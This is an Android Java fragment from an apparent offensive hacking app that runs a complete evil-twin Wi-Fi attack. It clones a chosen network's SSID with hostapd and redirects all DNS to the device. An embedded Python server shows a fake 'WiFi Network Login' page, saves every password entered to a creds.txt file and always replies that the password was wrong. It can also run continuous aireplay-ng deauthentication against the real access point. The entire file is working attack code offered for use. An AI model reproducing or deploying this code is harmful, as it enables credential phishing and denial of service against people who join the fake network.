package com.opx.yourdemon.evil_twin;


import android.annotation.SuppressLint;
import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.CheckBox;
import android.widget.EditText;
import android.widget.TextView;

import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

import com.google.android.material.button.MaterialButton;
import com.google.android.material.dialog.MaterialAlertDialogBuilder;
import com.opx.yourdemon.R;
import com.opx.yourdemon.custom.WiFINetwork;
import com.opx.yourdemon.utils.Core;
import com.opx.yourdemon.utils.CustomCommand;
import com.opx.yourdemon.utils.OnSwipeListener;
import com.opx.yourdemon.utils.TaskRunner;
import com.opx.yourdemon.wifi.utils.ScanWifi;

import net.cachapa.expandablelayout.ExpandableLayout;

import java.util.ArrayList;

public class EvilTwinFragment extends Fragment {

    private static final String HOST_DIR = "/storage/emulated/0/YourDemon/et";
    private static final String CHROOT_DIR = "/sdcard/YourDemon/et";
    private static final String CAPTURE_HOST_DIR = "/storage/emulated/0/YourDemon/captured";

    public Core core;
    public EditText ssidInput, channelInput, bssidInput, apIfaceInput, monIfaceInput;
    public MaterialButton scanBtn, startBtn, stopBtn;
    public CheckBox deauthCheck;
    public TextView statusText, logText;

    private boolean running = false;

    @Nullable
    @Override
    public View onCreateView(LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.evil_twin, container, false);
        core = new Core(getContext());

        ssidInput = view.findViewById(R.id.et_ssid_input);
        channelInput = view.findViewById(R.id.et_channel_input);
        bssidInput = view.findViewById(R.id.et_bssid_input);
        apIfaceInput = view.findViewById(R.id.et_ap_iface_input);
        monIfaceInput = view.findViewById(R.id.et_mon_iface_input);
        scanBtn = view.findViewById(R.id.et_scan_btn);
        startBtn = view.findViewById(R.id.et_start_btn);
        stopBtn = view.findViewById(R.id.et_stop_btn);
        deauthCheck = view.findViewById(R.id.et_deauth_check);
        statusText = view.findViewById(R.id.et_status_text);
        logText = view.findViewById(R.id.et_log_text);

        apIfaceInput.setText("wlan0");
        monIfaceInput.setText("wlan1mon");
        channelInput.setText("6");

        scanBtn.setOnClickListener(v -> scanNetworks());
        startBtn.setOnClickListener(v -> startAttack());
        stopBtn.setOnClickListener(v -> stopAttack());
        stopBtn.setEnabled(false);

        if (getActivity() != null) {
            ExpandableLayout menu = getActivity().findViewById(R.id.menu_expand);
            view.setOnTouchListener(new OnSwipeListener(getContext()) {
                public void onSwipeTop() { core.closemenu(menu); }
                @SuppressLint("ClickableViewAccessibility")
                public void onSwipeRight() { }
                public void onSwipeLeft() { }
                public void onSwipeBottom() { core.openmenu(menu); }
            });
        }

        return view;
    }

    private void scanNetworks() {
        statusText.setText(core.str("et_scanning"));
        TaskRunner.execute(() -> {
            String wlan = core.getString("wlan_scan");
            if (wlan == null || wlan.isEmpty()) wlan = "wlan0";
            ArrayList<WiFINetwork> networks = ScanWifi.execute(wlan, core);
            if (getActivity() == null) return;
            getActivity().runOnUiThread(() -> {
                statusText.setText("");
                if (networks == null || networks.isEmpty()) {
                    core.toaster(core.str("et_no_networks"));
                    return;
                }
                String[] items = new String[networks.size()];
                for (int i = 0; i < networks.size(); i++) {
                    WiFINetwork n = networks.get(i);
                    String ssid = n.getSsid();
                    items[i] = (ssid == null || ssid.isEmpty() ? "Hidden" : ssid)
                            + "  |  Ch " + n.getChannel() + "  |  " + n.getMac();
                }
                new MaterialAlertDialogBuilder(requireContext())
                        .setTitle(core.str("et_select_network"))
                        .setItems(items, (dialog, which) -> {
                            WiFINetwork n = networks.get(which);
                            String ssid = n.getSsid();
                            ssidInput.setText(ssid == null || ssid.equals("Hidden network") ? "" : ssid);
                            channelInput.setText(n.getChannel());
                            bssidInput.setText(n.getMac());
                        })
                        .show();
            });
        });
    }

    private void startAttack() {
        String ssid = ssidInput.getText().toString().trim();
        String channel = channelInput.getText().toString().trim();
        if (ssid.isEmpty() || channel.isEmpty()) {
            core.toaster(core.str("et_please_fill"));
            return;
        }
        String bssid = bssidInput.getText().toString().trim();
        String apIface = apIfaceInput.getText().toString().trim();
        String monIface = monIfaceInput.getText().toString().trim();
        boolean deauth = deauthCheck.isChecked();

        running = true;
        startBtn.setEnabled(false);
        stopBtn.setEnabled(true);

        TaskRunner.execute(() -> {
            try {
                setStatus("et_setup_iface");
                exec("mkdir -p " + HOST_DIR);
                exec("mkdir -p " + CAPTURE_HOST_DIR);
                exec("ip link set " + apIface + " down");
                exec("ip addr flush dev " + apIface);
                exec("ip addr add 192.168.4.1/24 dev " + apIface);
                exec("ip link set " + apIface + " up");

                setStatus("et_enable_forward");
                exec("echo 1 > /proc/sys/net/ipv4/ip_forward");

                setStatus("et_wan_detect");
                String wan = getWanInterface();
                setStatus("et_setup_iptables");
                exec("iptables -t nat -A POSTROUTING -o " + wan + " -j MASQUERADE");
                exec("iptables -A FORWARD -i " + apIface + " -o " + wan + " -j ACCEPT");
                exec("iptables -A FORWARD -i " + wan + " -o " + apIface + " -m state --state RELATED,ESTABLISHED -j ACCEPT");

                setStatus("et_write_hostapd");
                String hostapdConf = "interface=" + apIface + "\ndriver=nl80211\nssid=" + ssid
                        + "\nhw_mode=g\nchannel=" + channel + "\nwmm_enabled=0\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0\n";
                exec("echo '" + hostapdConf + "' > " + HOST_DIR + "/hostapd.conf");

                setStatus("et_start_hostapd");
                execChroot("nohup hostapd " + CHROOT_DIR + "/hostapd.conf -B >>" + CHROOT_DIR + "/hostapd.log 2>&1 &");

                setStatus("et_start_dns_dhcp");
                String dnsmasqConf = "interface=" + apIface + "\nbind-interfaces\ndhcp-range=192.168.4.2,192.168.4.100,255.255.255.0,12h\n"
                        + "dhcp-option=3,192.168.4.1\ndhcp-option=6,192.168.4.1\naddress=/#/192.168.4.1\nno-resolv\n";
                exec("echo '" + dnsmasqConf + "' > " + HOST_DIR + "/dnsmasq.conf");
                execChroot("nohup dnsmasq -C " + CHROOT_DIR + "/dnsmasq.conf >>" + CHROOT_DIR + "/dnsmasq.log 2>&1 &");

                setStatus("et_start_portal");
                writePortalFiles(ssid);
                execChroot("nohup python3 " + CHROOT_DIR + "/capture_server.py >>" + CHROOT_DIR + "/server.log 2>&1 &");

                if (deauth) {
                    setStatus("et_start_deauth");
                    if (bssid.isEmpty()) {
                        core.toaster(core.str("et_bssid_hint"));
                    } else {
                        execChroot("nohup aireplay-ng -0 0 -a " + bssid + " " + monIface + " >>" + CHROOT_DIR + "/deauth.log 2>&1 &");
                    }
                }

                setStatus("et_running");
                appendLog(core.str("et_creds_saved") + " /sdcard/YourDemon/captured/creds.txt");
            } catch (Exception e) {
                String errorMsg = core.str("error") + ": " + e.getMessage();
                if (getActivity() != null) {
                    getActivity().runOnUiThread(() -> statusText.setText(errorMsg));
                }
            }
        });
    }

    private void stopAttack() {
        running = false;
        statusText.setText(core.str("et_stopping"));
        String apIface = apIfaceInput.getText().toString().trim();
        TaskRunner.execute(() -> {
            try {
                setStatus("et_cleanup");
                execChroot("pkill hostapd; pkill dnsmasq; pkill -f capture_server.py; pkill -f aireplay-ng");
                String wan = getWanInterface();
                exec("iptables -t nat -D POSTROUTING -o " + wan + " -j MASQUERADE");
                exec("iptables -D FORWARD -i " + apIface + " -o " + wan + " -j ACCEPT");
                exec("iptables -D FORWARD -i " + wan + " -o " + apIface + " -m state --state RELATED,ESTABLISHED -j ACCEPT");
                exec("echo 0 > /proc/sys/net/ipv4/ip_forward");
                exec("ip addr del 192.168.4.1/24 dev " + apIface);
            } catch (Exception e) {
                String errorMsg = core.str("error") + ": " + e.getMessage();
                if (getActivity() != null) {
                    getActivity().runOnUiThread(() -> statusText.setText(errorMsg));
                }
            }
            if (getActivity() != null) {
                getActivity().runOnUiThread(() -> {
                    startBtn.setEnabled(true);
                    stopBtn.setEnabled(false);
                    statusText.setText(core.str("et_stopped"));
                });
            }
        });
    }

    private void writePortalFiles(String ssid) throws Exception {
        String html = "<html><head><title>WiFi Login</title><meta name='viewport' content='width=device-width,initial-scale=1'>"
                + "<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#1565C0,#3700B3);min-height:100vh;display:flex;align-items:center;justify-content:center}"
                + ".card{background:#fff;border-radius:12px;padding:40px;width:90%;max-width:400px;box-shadow:0 15px 35px rgba(0,0,0,0.3);text-align:center}"
                + "h2{color:#333;margin-bottom:8px}p{color:#777;margin-bottom:20px;font-size:14px}"
                + "input{width:100%;padding:14px;margin:8px 0;border:2px solid #e0e0e0;border-radius:8px;font-size:16px;outline:none;transition:border .3s}input:focus{border-color:#1565C0}"
                + "button{width:100%;padding:14px;background:linear-gradient(135deg,#1565C0,#3700B3);color:#fff;border:none;border-radius:8px;font-size:16px;cursor:pointer;font-weight:bold;margin-top:8px}"
                + "</style></head><body><div class='card'><h2>WiFi Network Login</h2><p>The network <b>" + ssid
                + "</b> requires a password. Enter the password to connect.</p>"
                + "<form method='POST' action='/login'><input type='password' name='password' placeholder='Enter WiFi Password' required>"
                + "<button type='submit'>Connect</button></form></div></body></html>";

        String py = "#!/usr/bin/env python3\n"
                + "import http.server, socketserver, time, urllib.parse, os\n"
                + "PORT = 80\n"
                + "LOG = \"/sdcard/YourDemon/captured/creds.txt\"\n"
                + "PAGE_FILE = \"/sdcard/YourDemon/et/index.html\"\n"
                + "def page():\n"
                + "    try:\n"
                + "        with open(PAGE_FILE) as f:\n"
                + "            return f.read()\n"
                + "    except Exception:\n"
                + "        return \"<html><body><h2>WiFi Login</h2><form method='POST' action='/login'><input type='password' name='password' required><button>Connect</button></form></body></html>\"\n"
                + "class H(http.server.BaseHTTPRequestHandler):\n"
                + "    def do_GET(self):\n"
                + "        self.send_response(200)\n"
                + "        self.send_header(\"Content-Type\", \"text/html\")\n"
                + "        self.end_headers()\n"
                + "        self.wfile.write(page().encode())\n"
                + "    def do_POST(self):\n"
                + "        length = int(self.headers.get(\"Content-Length\", 0))\n"
                + "        body = self.rfile.read(length).decode() if length else \"\"\n"
                + "        q = urllib.parse.parse_qs(body)\n"
                + "        pwd = q.get(\"password\", [\"\"])[0]\n"
                + "        try:\n"
                + "            os.makedirs(os.path.dirname(LOG), exist_ok=True)\n"
                + "            with open(LOG, \"a\") as f:\n"
                + "                f.write(\"%s | %s\\n\" % (time.strftime(\"%Y-%m-%d %H:%M:%S\"), pwd))\n"
                + "        except Exception:\n"
                + "            pass\n"
                + "        self.send_response(200)\n"
                + "        self.send_header(\"Content-Type\", \"text/html\")\n"
                + "        self.end_headers()\n"
                + "        html = page()\n"
                + "        html = html.replace(\"Enter the password\", \"Incorrect password, please try again\")\n"
                + "        self.wfile.write(html.encode())\n"
                + "    def log_message(self, fmt, *args):\n"
                + "        pass\n"
                + "socketserver.TCPServer.allow_reuse_address = True\n"
                + "httpd = socketserver.TCPServer((\"0.0.0.0\", PORT), H)\n"
                + "httpd.serve_forever()\n";

        exec("cat > " + HOST_DIR + "/index.html << 'HTMLEOF'\n" + html + "\nHTMLEOF");
        exec("cat > " + HOST_DIR + "/capture_server.py << 'PYEOF'\n" + py + "\nPYEOF");
        exec("chmod 644 " + HOST_DIR + "/index.html");
        exec("chmod 755 " + HOST_DIR + "/capture_server.py");
    }

    private void setStatus(String key) {
        if (getActivity() != null) {
            getActivity().runOnUiThread(() -> statusText.setText(core.str(key)));
        }
    }

    private void appendLog(String msg) {
        if (getActivity() != null) {
            getActivity().runOnUiThread(() -> logText.append(msg + "\n"));
        }
    }

    private String getWanInterface() {
        try {
            Process process = Runtime.getRuntime().exec("su");
            java.io.OutputStream stdin = process.getOutputStream();
            java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));
            stdin.write(("ip route | grep default | awk '{print $5}' | head -1\n").getBytes());
            stdin.write(("exit\n").getBytes());
            stdin.flush();
            stdin.close();
            String line = br.readLine();
            process.waitFor();
            process.destroy();
            if (line != null && !line.trim().isEmpty()) {
                return line.trim();
            }
        } catch (Exception e) {
            appendLog(core.str("error") + ": " + e.getMessage());
        }
        return "wlan0";
    }

    private void exec(String cmd) throws Exception {
        CustomCommand.execute(cmd, core);
    }

    private void execChroot(String cmd) throws Exception {
        CustomCommand.execute(core.EXECUTE + cmd, core);
    }
}
